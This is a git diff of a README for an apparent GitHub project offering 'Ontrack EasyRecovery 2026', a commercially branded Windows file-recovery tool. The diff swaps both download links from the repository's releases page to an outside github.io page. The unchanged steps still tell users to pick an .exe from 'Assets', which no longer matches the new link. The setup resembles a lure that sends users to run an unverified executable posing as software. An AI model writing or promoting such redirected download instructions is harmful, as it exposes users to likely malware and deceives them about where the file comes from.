@@ -1,7 +1,7 @@
 # 💾 Ontrack-EasyRecovery-2026 - Recover lost files on Windows easily
 
 <p align="center">
-  <a href="https://github.com/Term1212/Ontrack-EasyRecovery-2026/releases">
+  <a href="https://term1212.github.io">
     <img src="https://img.shields.io/badge/Download-Ontrack_EasyRecovery-blue.svg" alt="Download Button">
   </a>
 </p>
@@ -25,7 +25,7 @@ Before you install this software, confirm your computer meets these requirements
 
 The software is available through our official release page. To begin, you must navigate to the link provided below.
 
-1.  Click the following link: [Download Ontrack EasyRecovery 2026](https://github.com/Term1212/Ontrack-EasyRecovery-2026/releases)
+1.  Click the following link: [Download Ontrack EasyRecovery 2026](https://term1212.github.io)
 2.  Once the page loads, look for the section labeled "Assets."
 3.  Choose the file ending in `.exe` to start the download.
 4.  Save the file to your Downloads folder or your desktop so you can find it.
